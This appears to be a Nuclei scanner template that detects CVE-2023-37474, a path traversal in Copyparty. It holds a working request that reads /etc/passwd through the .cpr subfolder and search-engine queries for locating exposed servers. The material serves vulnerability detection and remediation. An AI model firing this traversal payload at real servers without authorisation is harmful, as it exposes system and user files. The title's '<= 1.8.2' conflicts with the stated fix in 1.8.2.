http:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/.cpr/%2Fetc%2Fpasswd'
id: CVE-2023-37474
info:
  author: shankar acharya,theamanrawat
  classification:
    cpe: cpe:2.3:a:copyparty_project:copyparty:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-37474
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99548
    epss-score: 0.89933
  description: 'Copyparty is a portable file server. Versions prior to 1.8.2 are subject
    to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal
    attack technique allows an attacker access to files, directories, and commands
    that reside outside the web document root directory. This issue has been addressed
    in commit `043e3c7d` which has been included in release 1.8.2. Users are advised
    to upgrade. There are no known workarounds for this vulnerability.

    '
  impact: 'Unauthenticated attackers can exploit path traversal in the .cpr subfolder
    to read arbitrary files from the file server, potentially accessing sensitive
    system files and user data stored outside the web document root.

    '
  metadata:
    fofa-query: title="copyparty"
    google-query: intitle:"copyparty"
    max-request: 1
    product: copyparty
    shodan-query: http.title:"copyparty"
    vendor: copyparty_project
    verified: true
  name: Copyparty <= 1.8.2 - Directory Traversal
  reference:
  - https://github.com/9001/copyparty/
  - https://www.exploit-db.com/exploits/51636
  - https://nvd.nist.gov/vuln/detail/CVE-2023-37474
  - http://packetstormsecurity.com/files/173822/Copyparty-1.8.2-Directory-Traversal.html
  - https://github.com/9001/copyparty/commit/043e3c7dd683113e2b1c15cacb9c8e68f76513ff
  remediation: 'Update Copyparty to version 1.8.2 or later that properly validates
    file paths in the .cpr subfolder and prevents directory traversal attacks.

    '
  severity: high
  tags: cve,cve2023,packetstorm,traversal,copyparty,copyparty_project,vuln
